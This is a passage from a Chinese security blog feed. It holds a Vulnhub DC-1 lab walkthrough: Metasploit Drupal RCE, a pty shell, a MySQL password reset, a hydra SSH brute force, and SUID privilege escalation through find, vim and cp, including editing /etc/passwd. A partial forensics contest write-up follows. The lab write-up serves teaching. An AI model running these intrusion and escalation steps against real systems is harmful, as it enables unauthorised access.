是7版本的漏洞</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311192028910.png" alt="image-20231031204347126"></p><h4 id="3-使用msfconsole扫exp"><a href="#3-使用msfconsole扫exp" class="headerlink" title="3.使用msfconsole扫exp"></a>3.使用msfconsole扫exp</h4><p>msfconsole命令简单介绍</p><pre><code>msfconsole进入MSF控制台search *搜索相应模块use *          对应模块show options  查看信息set RHOST  远程主机iprun           攻击show info       查看模块的详细信息</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311052139678.png" alt="image-20231105213954599"></p><h5 id="搜索drupal模块"><a href="#搜索drupal模块" class="headerlink" title="搜索drupal模块"></a>搜索drupal模块</h5><pre><code>search drupal</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311052141123.png" alt="image-20231105214125065"></p><h5 id="选中模块"><a href="#选中模块" class="headerlink" title="选中模块"></a>选中模块</h5><p>发现模块1是远程命令执行漏洞 使用模块1搞一下</p><pre><code>use 1show options   查看详细信息</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311192028193.png" alt="image-20231117171533101"></p><h5 id="设置靶机ip运行msf"><a href="#设置靶机ip运行msf" class="headerlink" title="设置靶机ip运行msf"></a>设置靶机ip运行msf</h5><pre><code>set RHOST 192.168.160.146  设置靶机iprun                        开始攻击</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311192028889.png" alt="image-20231117182012241"></p><h4 id="4-进入shell"><a href="#4-进入shell" class="headerlink" title="4.进入shell"></a>4.进入shell</h4><p>exp运行成功 我们进入shell</p><pre><code>shell</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311192028025.png" alt="image-20231117183849319"></p><h4 id="5-flag1"><a href="#5-flag1" class="headerlink" title="5.flag1"></a>5.flag1</h4><p>进入目录 找到flag1</p><pre><code>lscat flag1.txt</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311192028574.png" alt="image-20231117183914026"></p><pre><code>Every good CMS needs a config file - and so do you.翻译：每个优秀的内容管理系统(CMS)都需要配置文件，你也一样。</code></pre><h4 id="6-flag2"><a href="#6-flag2" class="headerlink" title="6.flag2"></a>6.flag2</h4><p>flag1的内容提示我们寻找配置文件 </p><p>我们先使用python反弹一个交互式shell</p><pre><code>python -c &#39;import pty; pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311192028712.png" alt="image-20231117185938351"></p><p>gpt做题法</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311212113951.png" alt="image-20231117190400954"></p><p>找到<code>/var/www/sites/default/settings.php</code> 查看内容 找到flag2 还找到了数据库的配置文件</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311192028770.png" alt="image-20231117190903810"></p><pre><code>flag2Brute force and dictionary attacks aren&#39;t theonly ways to gain access (and you WILL need access).What can you do with these credentials?翻译：爆破和字典攻击并不是获得访问权限的唯一方式(你需要访问权限) 你能用这些证书做什么</code></pre><h4 id="7-flag3"><a href="#7-flag3" class="headerlink" title="7.flag3"></a>7.flag3</h4><h5 id="进入数据库"><a href="#进入数据库" class="headerlink" title="进入数据库"></a>进入数据库</h5><p>flag2提示我们提升权限不能靠爆破和字典攻击  不知道上面提到的证书是什么意思</p><p>但是我们知道数据库的信息了 就先看一下数据库</p><pre><code>mysql -udbuser -pEnter password: R0ck3t</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311192028662.png" alt="image-20231117192340717"></p><p>进入后 查数据库 查表 查字段 查内容  </p><pre><code>show databases;use drupaldb;show tables;show columns from users;select name,pass from users;</code></pre><p>可以找到admin用户的密码  但是一看就是加盐了</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311192029072.png" alt="image-20231117200258507"></p><p>没关系 直接改成弱密码<code>123456</code>就行了</p><p>但是再次之前 我们需要找到他的加密脚本 将加盐加密的<code>123456</code>放入数据库中</p><p>在&#x2F;var&#x2F;www&#x2F;scripts&#x2F;password-hash.sh</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311192028085.png" alt="image-20231117205111604"></p><pre><code>$S$D/ckVXyCs7v65HPpFO/zG93O33n/wdyqQF7po2sOp07Dw5/I6X/P</code></pre><p>再次进入数据库 更改密码</p><pre><code>update users set pass=&#39;$S$D/ckVXyCs7v65HPpFO/zG93O33n/wdyqQF7po2sOp07Dw5/I6X/P&#39; where name=&#39;admin&#39;;</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311192028637.png" alt="image-20231117213946445"></p><h5 id="登入网页"><a href="#登入网页" class="headerlink" title="登入网页"></a>登入网页</h5><p>使用<code>admin/123456</code>成功登陆</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311192029321.png" alt="image-20231117214115213"></p><p>翻找网页内容 找到flag3</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311192029896.png" alt="image-20231117214212927"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311192029358.png" alt="image-20231117214430542"></p><pre><code>flag3Special PERMS will help FIND the passwd - but you&#39;ll need to -exec that command to work out how to get what&#39;s in the shadow.翻译：特殊的权限可以帮助找到密码，但你需要执行该命令才能知道如何获取shadow中的内容。</code></pre><h4 id="8-flag4"><a href="#8-flag4" class="headerlink" title="8.flag4"></a>8.flag4</h4><p>在&#x2F;home文件夹中找到flag4</p><pre><code>flag4Can you use this same method to find or access the flag in root?                                                                                                                                                                                                 Probably. But perhaps it&#39;s not that easy.  Or maybe it is?翻译：你能用同样的方法找到或访问 root 中的flag吗？                                                                                                                                                                                                也许可以。但也许没那么容易。 又或许可以？</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311191627932.png" alt="image-20231119162704880"></p><p>flag3中提到shadow文件 但是一般情况来讲 查看shadow文件都需要使用root权限</p><p>我们可以看到 现在是www-data权限 查看shadow文件 权限不够</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311192029539.png" alt="image-20231118204944510"></p><p>但是我们可以查看passwd文件 可以看到确实是有flag4这个用户</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311191631172.png" alt="image-20231119163126120"></p><h5 id="hydra"><a href="#hydra" class="headerlink" title="hydra"></a>hydra</h5><p>这里学到一点 可以尝试使用hydra进行密码爆破 这里我们使用password.lst字典进行爆破</p><pre><code>hydra -l flag4 -P /home/kali/Desktop/brutehash/password.lst ssh://192.168.160.146-l 指定用户名-P 加载密码字典（自定义)ssh://ip 指定使用协议和ip地址</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311191723636.png" alt="image-20231119172333588"></p><p>爆破出flag4的密码是<code>orange</code> </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311191724043.png" alt="image-20231119172417992"></p><p>登录成功 拿到flag4权限</p><h4 id="9-thefinalflag"><a href="#9-thefinalflag" class="headerlink" title="9.thefinalflag"></a>9.thefinalflag</h4><h5 id="suid提权"><a href="#suid提权" class="headerlink" title="suid提权"></a>suid提权</h5><p>由flag4的提示  我们得知在&#x2F;root文件夹中还有一个flag  但是我们现在并没有root权限 </p><p>由flag3的内容当作提示 我们想到需要进行权限的提升   在提示中提到了<code>-exec</code>命令 想到suid提权 在这里我们使用find命令</p><h6 id="suid"><a href="#suid" class="headerlink" title="suid"></a>suid</h6><pre><code>suid是一种对二进制程序(我们执行的命令就是一种二进制程序)设置的特殊权限 设置了suid权限的程序 在用户执行该程序时 用户的权限是该程序属主的权限 如果程序属主是root权限 那么执行该程序的用户就将暂时获得root权限要注意：1. SUID权限只能设置二进制文件2. 命令执行者要有二进制文件的执行权3. 命令执行者执行二进制文件时会获得该程序的属主身份4. SUID权限只在程序执行中有效</code></pre><h6 id="find"><a href="#find" class="headerlink" title="find"></a>find</h6><pre><code>一、按名称或正则表达式查找文件格式：find . -name test.txt     // .符号代表路径 test.txt的位置放想要查找的文件名字find . -name &quot;*.txt&quot;           // 使用正则表达式 查找所有txt文件find . -type f -name &quot;*.txt&quot;   // 最好还是使用-type指定查找普通文件 以使所有内容更清晰// -type参数的一些用法字母文件类型bblock (buffered) specialccharacter (unbuffered) specialddirectory（目录）pnamed pipe (FIFO)（命名管道）lsymbolic link; this is never true if the -L option or the -follow option is in effect, unless the symbolic link is broken.       If you want to search for symbolic links when -L is in effect, use -xtype. （软连接；如果-L或者-follow选项生效，这个字母就不能用，除非     软连接断开了。如果你想在-L生效的时候，搜索软连接，使用-xtype选项）fregular file（普通文件）ssocketDdoor (Solaris)//二、查找不同类型的文件我们可以使用不同的-type参数 来查找不同类型的文件 find . -type d -name &quot;w3n*&quot;    // 使用 d 参数 查找所有名字中含有 w3n 的目录find . -type l -name &quot;w3n*&quot;    // 使用 l 参数 查找所有名字中含有 w3n 的符号链接三、按特定的时间戳查找文件linux中三种不同的时间戳：访问时间戳(atime)：最后一次读取文件的时间修改时间戳(mtime)：文件内容最后一次修改时间更改时间戳(ctime)：上次更改文件元数据的时间 例如所有权、位置、文件类型等+ 是大于 -是小于find . -type f -atime +365    // 查找最后一次访问时间超过一年的文件find . -type f -mtime 5       // 查找最后一次修改时间为5天前的文件find . -type f -ctime +5 -ctime -10  // 查找上次更改元数据时间为5到10天前的文件四、按大小查找文件-size参数可以帮助我们按照文b: 512 字节（默认）c: 字节w: 两字节字k: 千字节M: 兆字节G: 千兆字节件大小来进行查找find . -type f -size +10M -size -1G   // 查找文件大小大于10M 小于1G的文件五、按权限查找文件-perm可以帮助我们按特定权限查找文件//常见的权限数字444 r--r--r--600 rw-------644 rw-r--r--666 rw-rw-rw-700 rwx------744 rwxr--r--755 rwxr-xr-x777 rwxrwxrwx从左至右，1-3位数字代表文件所有者的权限，4-6位数字代表同组用户的权限，7-9数字代表其他用户的权限。读取权限：等于4 用 r 表示写入权限：等于2 用 w 表示执行权限：等于1 用 x 表示eg.755 7: 4+2+1 文件所有者拥有读取、写入、执行权限5：4+0+1 同组用户拥有读取、执行权限5:4+0+1 其他用户拥有读取、执行权限//find . -type f -perm 777   // 查找所有具有777权限的文件 这意味着这些文件对其所有者、组和所有用户具有所有的读、写和可执行权限六、按所有权查找文件-user可以让我们按照所有权查找文件find . -type f -user w3nx1z1  // 查找所有所有权是w3nx1z1的文件七、找到文件后执行命令使用-exec在Linux中，exec是一个用于替换当前进程的系统调用 当一个进程调用exec时，它会被一个新的程序所替代，而新程序将从其main函数或入口点开始执行。这意味着原始进程的代码、数据和堆栈都会被新程序的相应部分所取代，从而实现了进程的自我替换。在使用-exec命令时 必须要注意严格遵守以下格式： -exec 命令 &#123;&#125; \;find . -type f -atime +5 -exec ls &#123;&#125; \;    // 查找所有最后访问时间超过5天的文件 并将其列出find . -type f -atime +365 -exec rmm -rf &#123;&#125; \;  // 查找所有最后访问时间超过一年的文件 并将其删除find /etc -type f -name &quot;passwd&quot; -exec grep &quot;root&quot; &#123;&#125; \;   // 查找在/etc文件夹下名为&quot;passwd&quot;的文件 并使用grep查找其中是否有名为&quot;root&quot;的用户</code></pre><p>现在我们已经了解了一点关于suid提权的基本内容 再来看一下suid提权的具体操作</p><h6 id="设置-x2F-去掉suid"><a href="#设置-x2F-去掉suid" class="headerlink" title="设置&#x2F;去掉suid"></a><strong>设置&#x2F;去掉suid</strong></h6><pre><code>chmod u+s filename 设置suid位chmod u-s filename 去掉suid位</code></pre><h6 id="查找suid"><a href="#查找suid" class="headerlink" title="查找suid"></a><strong>查找suid</strong></h6><pre><code>find / -type f -perm -u=s(或者-4000) 2&gt;dev/null</code></pre><h6 id="find命令提权"><a href="#find命令提权" class="headerlink" title="find命令提权"></a><strong>find命令提权</strong></h6><p>如果find命令不是suid权限 先给find命令设置suid权限</p><pre><code>chmod u+s /bin/usr/find</code></pre><p>进行提权</p><pre><code>find 已有文件名 -exec whoami \;</code></pre><h6 id="vim命令提权"><a href="#vim命令提权" class="headerlink" title="vim命令提权"></a><strong>vim命令提权</strong></h6><p>赋予vim suid权限</p><pre><code>chmod u+s /bin/vim</code></pre><p>使用vim在&#x2F;etc&#x2F;sudoers中创建一个用户</p><pre><code>vim /etc/sudoers</code></pre><p>格式和root用户一样</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311191551346.png" alt="image-20231119155142302"></p><pre><code>su - testsudo bashwhoami</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311191552665.png" alt="image-20231119155218610"></p><h6 id="cp命令提权"><a href="#cp命令提权" class="headerlink" title="cp命令提权"></a><strong>cp命令提权</strong></h6><p>同样 先赋予&#x2F;usr&#x2F;bin&#x2F;cp suid权限</p><pre><code>chmod u+s /usr/bin/cp</code></pre><p><font color='red'>拥有suid权限的程序会由rwx变为rws</font></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311191558309.png" alt="image-20231119155819258"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311191558944.png" alt="image-20231119155852911"></p><p>使用cp将&#x2F;etc&#x2F;passwd复制到当前用户的文件夹下</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311191613289.png" alt="image-20231119161306240"></p><p>使用openssl生成一个密码 </p><pre><code>openssl passwd -1 -salt 1*2*3 abcd   // passwd参数代表生成一个密码，-1为md5,-salt指定盐(随意),最后要跟加密的值，也就是密码</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311191614387.png" alt="image-20231119161458344"></p><p>使用vim编辑.&#x2F;passwd 创建一个新用户 并将密码添加在其中 使用过<code>:wq!</code>强制保存</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311191609597.png" alt="image-20231119160909564"></p><p>再将这个.&#x2F;passwd复制回原来的位置 </p><pre><code>cp ./passwd /etc/passwd</code></pre><p>此时在<code>su abc</code>输入密码<code>abcd</code>就是root用户了</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311191620814.png" alt="image-20231119162038742"></p><p>那么接下来 就使用find命令对靶场进行提权</p><p>首先使用find命令查找拥有suid权限的程序   在根目录下执行以下命令 </p><pre><code>find / -type f -perm -u=s 2&gt;dev/null</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311191342964.png" alt="image-20231119134236870"></p><p>发现find命令是有suid权限的 那么我们就可以使用find来进行suid提权了</p><pre><code>find / -type f -exec /bin/sh \;whoami</code></pre><p>成功root</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311192029127.png" alt="image-20231119181109107"></p><p>进入&#x2F;root文件夹 找到<code>thefinalflag.txt</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311192029423.png" alt="image-20231119181153026"></p><pre><code>thefinalflag.txtWell done!!!!Hopefully you&#39;ve enjoyed this and learned some new skills.You can let me know what you thought of this little journeyby contacting me via Twitter - @DCAU7</code></pre><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>至此，靶场中的全部flag完全拿到了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;vulnhub靶场记录DC-1&quot;&gt;&lt;a href=&quot;#vulnhub靶场记录DC-1&quot; class=&quot;headerlink&quot; title=&quot;vulnhub靶场记录DC-1&quot;&gt;&lt;/a&gt;vulnhub靶场记录DC-1&lt;/h1&gt;&lt;h2 id=&quot;靶机描述&quot;&gt;&lt;a href</summary>
      
    
    
    
    <category term="渗透" scheme="http://w3nx1z1.github.io/categories/%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="打靶" scheme="http://w3nx1z1.github.io/tags/%E6%89%93%E9%9D%B6/"/>
    
  </entry>
  
  <entry>
    <title>2022年美亚杯团体赛</title>
    <link href="http://w3nx1z1.github.io/2023/10/29/2022%E5%B9%B4%E7%BE%8E%E4%BA%9A%E6%9D%AF%E5%9B%A2%E4%BD%93%E8%B5%9B/"/>
    <id>http://w3nx1z1.github.io/2023/10/29/2022%E5%B9%B4%E7%BE%8E%E4%BA%9A%E6%9D%AF%E5%9B%A2%E4%BD%93%E8%B5%9B/</id>
    <published>2023-10-29T13:27:17.754Z</published>
    <updated>2023-11-17T01:44:16.643Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2022年美亚杯团体赛"><a href="#2022年美亚杯团体赛" class="headerlink" title="2022年美亚杯团体赛"></a>2022年美亚杯团体赛</h1><h2 id="AGC计算机"><a href="#AGC计算机" class="headerlink" title="AGC计算机"></a>AGC计算机</h2><h3 id="31"><a href="#31" class="headerlink" title="31."></a>31.</h3><pre><code>[单选题] 分析AGC-CS计算机 (Computer) 里最初的作業系統 (Windows) ，它的实際安装时间是什么? (以时区UTC+8回答) (3分)A. 2022-09-26 14:35:17B. 2022-09-26 21:35:17C. 2022-09-27 05:35:17D. 2022-10-05 03:52:15E. 2022-10-05 11:52:15</code></pre><pre><code>D</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170917381.png" alt="image-20231029161714704"></p><h3 id="32"><a href="#32" class="headerlink" title="32"></a>32</h3><pre><code>[单选题] AGC-CS计算机里的 ‘Acrobat DC’ 软件的安装时间是? (以时区UTC+8回答) (如答案为 2022-12-29 16:01:59，需回答 20221229160159) (1分)A. 2022-09-28 19:01:40B. 2022-09-28 07:18:33C. 2022-08-30 19:01:40D. 2022-08-30 07:18:33</code></pre><pre><code>A</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170917864.png" alt="image-20231029183709043"></p><p>火眼只能分析出第二个安装时间 但是不是选项 取证大师能分析出两个 选和选项差不多的第一个时间</p><h3 id="33"><a href="#33" class="headerlink" title="33"></a>33</h3><pre><code>[单选题]AGC-CS计算机里的用户 &#39;Carson&#39; 链接了一个网络磁盘机 (Network Drive)，在下列哪一个档案有相关资料? (2分)A. \Users\Carson\NTUSER.DATB. \Users\admin\NTUSER.DATC. \Windows\System32\config\SYSTEMD. \Windows\System32\config\SOFTWAREE. \Windows\System32\config\SECURITY</code></pre><pre><code>A</code></pre><p>根据34题 得知这个网络磁盘机是通过ip地址连接的 直接找ip 在跳转源文件就找到了</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170917752.png" alt="image-20231029190348751"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170918559.png" alt="image-20231029190830635"></p><h3 id="34"><a href="#34" class="headerlink" title="34"></a>34</h3><pre><code> [单选题] 承上题，用户 ‘Carson’ 连接的网络磁盘机的IP地址是什么? (1分)A. \192.168.182.134B. \192.168.182.134\photoC. \192.168.182.134\shareD. \192.168.182.134\AGCE. \192.168.182.134\AGC photo</code></pre><p>接上题</p><pre><code>C</code></pre><h3 id="35"><a href="#35" class="headerlink" title="35"></a>35</h3><pre><code>[填空题] 分析计算机里的电邮数据，当中包含嫌疑人王景浩可能的居住地址，请回答他住址的楼层 (以阿拉伯数字回答) (1分)</code></pre><pre><code>45</code></pre><p>在邮件附件的账单中 找到一个地址</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170918598.png" alt="image-20231029191313442"></p><h3 id="36"><a href="#36" class="headerlink" title="36"></a>36</h3><pre><code>[填空题] 承上题，王景浩使用的信用卡号码最后四位数字是? (1分)</code></pre><pre><code>6717</code></pre><p>在邮件中找到一张信用卡照片</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170918852.png" alt="image-20231029191554938"></p><h3 id="37"><a href="#37" class="headerlink" title="37"></a>37</h3><pre><code>[填空题] AGC-CS计算机用户 ‘Carson’ 曾经收到一个电邮并通过里面的链结下载了一个可疑的 ‘Word’ 文件，那个档案的档案名是什么? (不要输入 ‘.’，以大写英文及阿拉伯数字回答。如 Cat10.jpg，需回答CAT10JPG) (1分)</code></pre><pre><code>KEFMUONDOCX</code></pre><p>在收件箱中找到下载地址 尝试访问 但是无法访问QAQ</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170918012.png" alt="image-20231029193908164"></p><p>既然是下载的 那应该在用户的Download文件夹下 应该能找到一些东西</p><p>在文件分析中 找word文档 找到一个在download文件夹下的文件</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170918990.png" alt="image-20231029194630321"></p><h3 id="38"><a href="#38" class="headerlink" title="38"></a>38</h3><pre><code>[单选题] 承上题，分析该 ‘Word’ 文件，它的可能用途是? (3分)A. 访问一个网站B. 记录键盘操作C. 把档案加密D. 改变桌面壁纸E. 关闭计算机</code></pre><pre><code>A</code></pre><p>接上题 发现是一个可疑文件 放到云沙箱里面看一下</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170918151.png" alt="image-20231029195242723"></p><p>bcde选项的行为都没找到 看到一个和a选项很相关的行为</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170918715.png" alt="image-20231029195343332"></p><h3 id="39"><a href="#39" class="headerlink" title="39"></a>39</h3><pre><code>[单选题] AGC-CS计算机里有一个名为 ‘admin’ 的用户，它是在何时被建立的? (以时区UTC+8回答) (1分)A. 2022-09-28B. 2022-09-29C. 2022-09-30D. 2022-10-01E. 以上皆非</code></pre><pre><code>B</code></pre><p>直接翻日志 在日志分析——安全——账户管理中</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170918792.png" alt="image-20231029200259035"></p><h3 id="40"><a href="#40" class="headerlink" title="40"></a>40</h3><pre><code>[填空题] 黑客第一次采用用户 ‘admin’ 通过远程桌面协议 (Remote Desktop Protocol - RDP) 登录了AGC-CS计算机的时间是? (以时区UTC+8回答) (如答案为 2022-12-29 16:01:59，需回答 20221229160159) (2分)</code></pre><pre><code>20220929204102</code></pre><p>用户要在创建之后才能登陆 由上题 admin在<code>2022-09-29 20:41:02</code>才被创建成功 找到登陆&#x2F;注销日志  发现在创建之后 就使用显示凭据登录了 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170918438.png" alt="image-20231029204150657"></p><p>在账户登陆中 也可以看到 同时在网络地址中 也能看到登陆的ip并不是本地ip 也能证实是通过远程桌面协议登陆的</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170918892.png" alt="image-20231029204714875"></p><h3 id="41"><a href="#41" class="headerlink" title="41"></a>41</h3><pre><code>[填空题] 黑客入侵AGC-CS计算机后下载了一个扫描端口 (Port Scanning) 的软件，这软件的真正名称是? (以大写英文及阿拉伯数字回答) (3分)</code></pre><pre><code>PUTTY</code></pre><p>在安装软件里面找在admin账户创建之后下载安装的软件 只有这一个软件 经过download文件夹下载的 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170918027.png" alt="image-20231029205804575"></p><p>或者直接在浏览器下载记录中查看 时间也符合</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170918617.png" alt="image-20231029205904520"></p><p>搜一下这个软件能否进行端口扫描</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170918560.png" alt="image-20231029205952432"></p><h3 id="42"><a href="#42" class="headerlink" title="42"></a>42</h3><pre><code>[填空题] 承上题，黑客采用上述软件取得一些计算机的IP地址及媒体访问控制地址 (‘Media Access Control’ Address - MAC Address) 并存到一个名为 ‘ip.txt’ 的档案。 当中 ‘192.168.182.130’ 计算机的MAC地址是什么? (不要输入 ‘：’ 或 ‘-’ ，以大写英文及阿拉伯数字回答) (3分)</code></pre><pre><code>9061AEC09045</code></pre><p>找到这个ip.txt 但是已经被删了 但是我们已经知道了 黑客就是王景浩 因此这个ip.txt也会传到王景浩的电脑中 在分析王景浩的电脑 找到ip.txt</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170918187.png" alt="image-20231029212639655"></p><h3 id="43"><a href="#43" class="headerlink" title="43"></a>43</h3><pre><code>[填空题] AGC-CS计算机里的一个跳转列表 (Jumplist) 显示了用户 ‘admin’ 曾经采用记事本 (Notepad) 打开了一个文字档案，这个文字档的SHA-256哈希值是什么? (以大写英文及阿拉伯数字回答) (3分)</code></pre><pre><code>320A98F6519748D16B8870EF4D8A606D656C5A09CF2F660AA35EBF6495824CB1</code></pre><p>在最近访问的文档中 可以看到 使用notepad打开 且用户是admin的文档只有ip.txt</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170918341.png" alt="image-20231029211800054"></p><h3 id="44"><a href="#44" class="headerlink" title="44"></a>44</h3><pre><code>[单选题] 黑客除了通过 ‘RDP’ 外，还采用什么软件远端控制 (Remote Control) AGC-CS计算机? (1分)A. VNCB. TeamviewerC. AnydeskD. Splashtop Business AccessE. RemotePC</code></pre><pre><code>B</code></pre><p>在AGC的电脑中可以看到很多Teamviewer的痕迹</p><h2 id="AGC服务器"><a href="#AGC服务器" class="headerlink" title="AGC服务器"></a>AGC服务器</h2><p>服务器是三个软raid 直接全部挂载分析不出东西 详细说一下重组的过程 分为两种方法：UFS和取证大师</p><h3 id="UFS"><a href="#UFS" class="headerlink" title="UFS"></a>UFS</h3><p>首先在UFS中打开三个镜像 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311071510826.png" alt="image-20231107151033766"></p><p>全部打开后 就可以看到 已经识别组出原来的磁盘镜像<code>agc:0</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311071513562.png" alt="image-20231107151352502"></p><p>下面直接进行导出即可 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311071515340.png" alt="image-20231107151517284"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311071515624.png" alt="image-20231107151526570"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311071518716.png" alt="image-20231107151803656"></p><h3 id="取证大师"><a href="#取证大师" class="headerlink" title="取证大师"></a>取证大师</h3><p>先创建一个案例  添加三个镜像</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311071551532.png" alt="image-20231107155124484"></p><p>自动识别出动态磁盘 勾选确定进行解析 </p><p>看到已经解析出raid重组后的盘来了</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311071553552.png" alt="image-20231107155311504"></p><p>右键扫描磁盘结构 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311071600263.png" alt="image-20231107160040217"></p><p>在制作镜像文件就行</p><h3 id="45"><a href="#45" class="headerlink" title="45"></a>45</h3><pre><code>[填空题] AGC_Server里LVM (Logical Volume Management 逻辑卷轴管理) 的 VG (Volume Group 卷组) ‘pve’ 共有多少PE (Physical Extent 物理块) ? (以阿拉伯数字回答) (1分)</code></pre><pre><code>114147</code></pre><p>制作好之后 使用美亚的仿真软件 仿真起服务器</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311071602117.png" alt="image-20231107160251058"></p><p>登root  查ip 但是发现没有ens33  重新配置网卡</p><pre><code>cd  /etc/networkcat interfaces</code></pre><p>将上面改为下面的配置</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311071614896.png" alt="image-20231107161439843"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311071614070.png" alt="image-20231107161447037"></p><pre><code>systemctl restart networkingifconfig</code></pre><p>发现有ip了</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311071615663.png" alt="image-20231107161527610"></p><p>连xshell</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311071617674.png" alt="image-20231107161707613"></p><p>下面就可以做题了</p><pre><code>vgdisplay</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311071618067.png" alt="image-20231107161803023"></p><h3 id="46"><a href="#46" class="headerlink" title="46"></a>46</h3><pre><code>[填空题] AGC_Server里LVM 的 LV(邏輯卷)“pve-data” 使用了多少百分比的空間? (不用填寫 ‘%’，以阿拉伯数字回答) (3分)</code></pre><pre><code>2</code></pre><pre><code>df -h </code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311071619813.png" alt="image-20231107161953776"></p><h3 id="47"><a href="#47" class="headerlink" title="47"></a>47</h3><pre><code>[多选题] AGC_Server里的 ‘Proxmox’ 虚拟化环境 (Virtual Environment - VE) 有哪一个用户? (2分)A. rootB. VM_adminC. sysadminD. aclE. tss</code></pre><pre><code>AC</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311071626173.png" alt="image-20231107162634130"></p><p>要使用https协议进行登陆网页 访问<code>192.168.70.132:8006</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311071628436.png" alt="image-20231107162859381"></p><h3 id="48"><a href="#48" class="headerlink" title="48"></a>48</h3><pre><code>[填空题] 分析 ‘VM’ (虚拟机) 编号 ‘111’ AGC网站的网页服务器日志，当中记录了黑客曾向该服务器发出多少次與远程代码執行 (Remote Code Execution) 的网络攻击？ (以阿拉伯数字回答) (2分)</code></pre><pre><code>17</code></pre><p>UFS导出111的镜像需要会员  使用上面提到的网站仿真起虚拟机 但是不知道root密码</p><p><img 